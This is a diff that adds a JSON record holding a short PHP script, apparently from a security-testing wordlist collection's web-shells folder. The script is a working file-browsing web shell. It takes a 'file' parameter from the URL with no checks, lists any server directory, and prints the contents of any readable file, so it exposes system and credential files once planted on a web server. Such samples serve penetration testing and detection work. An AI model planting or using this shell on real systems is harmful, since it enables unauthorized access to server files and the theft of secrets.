@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/FuzzDB/list.php",
+  "title": "danielmiessler/SecLists/Web-Shells/FuzzDB/list.php",
+  "text": "<?\n//\n// PHP_KIT\n//\n// list.php = Directory & File Listing\n//\n// by: The Dark Raver\n// modified: 21/01/2004\n//\n?>\n\n<?\n\nif($_GET['file']) {\n\t$fichero=$_GET['file']; \n\t} else {\n\t$fichero=\"/\";\n\t} \n\nif($handle = @opendir($fichero)) {\n  while($filename = readdir($handle)) {\n    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filename . \"</a><br>\";\n    }\n  closedir($handle);\n  } else {\n  echo \"FILE: \" . $fichero . \"<br><hr><pre>\";\n  $fp = fopen($fichero, \"r\");\n  $buffer = fread($fp, filesize($fichero));\n  echo $buffer;\n  fclose($fp);\n  }\n\n?>",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/list.php",
+  "language": "php",
+  "kind": "code"
+}
